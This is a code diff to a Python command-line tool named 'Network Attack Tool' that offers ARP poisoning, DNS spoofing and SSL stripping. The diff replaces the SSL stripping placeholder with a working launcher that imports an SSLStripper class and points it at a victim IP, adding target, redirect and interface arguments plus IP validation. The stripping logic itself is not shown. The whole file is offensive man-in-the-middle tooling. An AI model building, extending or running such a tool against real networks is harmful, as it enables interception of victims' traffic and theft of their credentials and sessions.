@@ -2,6 +2,7 @@ import argparse
 import sys
 import os
 from arp_poisoning import ARP_Poisoning
+from ssl_stripping import SSLStripper  # <== ADDED
 import scapy.all as scapy
 
 def get_network_info():
@@ -44,7 +45,6 @@ def run_arp_poisoning(args):
     print(f"    Interval: {args.interval}s")
     print("[!] Press Ctrl+C to stop")
     
-    # Create and run ARP poisoning attack
     arp_attack = ARP_Poisoning(
         iface=args.interface,
         packet_interval=args.interval,
@@ -63,21 +63,29 @@ def run_dns_spoofing(args):
     sys.exit(1)
 
 def run_ssl_stripping(args):
-    """Execute SSL stripping attack (placeholder)"""
-    print("[!] SSL Stripping not implemented yet")
-    sys.exit(1)
+    """Execute SSL stripping attack"""
+    print(f"[+] Launching SSL Stripping")
+    print(f"    Victim IP: {args.target}")
+    print(f"    Redirecting to: {args.redirect}")
+    
+    default_iface, local_ip, _ = get_network_info()
+    ssl_stripper = SSLStripper(
+        interface=args.interface or default_iface,
+        ip_victim=args.target,
+        ip_attacker=local_ip,
+        site_to_spoof=args.redirect
+    )
+    ssl_stripper.strip()
 
 def main():
     # Get network information
     default_iface, local_ip, local_mac = get_network_info()
     
-    # Main parser
     parser = argparse.ArgumentParser(
         description='Network Attack Tool - ARP Poisoning, DNS Spoofing, SSL Stripping',
         formatter_class=argparse.RawDescriptionHelpFormatter,
     )
     
-    # Add subparsers for different attack modes
     subparsers = parser.add_subparsers(dest='mode', help='Attack mode')
     subparsers.required = True
     
@@ -97,50 +105,43 @@ def main():
     dns_parser.add_argument('--domain', required=True, help='Domain to spoof')
     dns_parser.add_argument('--redirect', required=True, help='IP to redirect to')
     
-    # SSL Stripping parser (placeholder for now)
-    ssl_parser = subparsers.add_parser('ssl', help='SSL Stripping attack (not implemented)')
+    # SSL Stripping parser (fully implemented)
+    ssl_parser = subparsers.add_parser('ssl', help='SSL Stripping attack')
     ssl_parser.add_argument('--target', required=True, help='Target IP address')
-    ssl_parser.add_argument('--port', type=int, default=443, help='Target port (default: 443)')
+    ssl_parser.add_argument('--redirect', required=True, help='Redirect HTTP site (e.g., example.com)')
+    ssl_parser.add_argument('--interface', default=default_iface, help=f'Network interface (default: {default_iface})')
     
-    # Parse arguments
     args = parser.parse_args()
     
-    # Validate that network info was obtained
     if not default_iface or not local_ip or not local_mac:
         print("[!] Error: Could not obtain network information")
         sys.exit(1)
     
-    # Mode-specific validation and execution
     if args.mode == 'arp':
-        # Validate ARP arguments
         if not validate_ip(args.victim_ip):
             print(f"[!] Error: Invalid victim IP address: {args.victim_ip}")
             sys.exit(1)
-        
         if not validate_mac(args.victim_mac):
             print(f"[!] Error: Invalid victim MAC address: {args.victim_mac}")
             sys.exit(1)
-        
         if not validate_ip(args.ip_to_spoof):
             print(f"[!] Error: Invalid spoof IP address: {args.ip_to_spoof}")
             sys.exit(1)
-        
         if args.interval <= 0:
             print(f"[!] Error: Interval must be positive: {args.interval}")
             sys.exit(1)
-        
-        # Check if arp_poisoning module exists
         if not os.path.exists('arp_poisoning.py'):
             print("[!] Error: arp_poisoning.py not found")
             sys.exit(1)
-        
-        # Run ARP poisoning
         run_arp_poisoning(args)
     
     elif args.mode == 'dns':
         run_dns_spoofing(args)
     
     elif args.mode == 'ssl':
+        if not validate_ip(args.target):
+            print(f"[!] Error: Invalid target IP address: {args.target}")
+            sys.exit(1)
         run_ssl_stripping(args)
 
 if __name__ == '__main__':
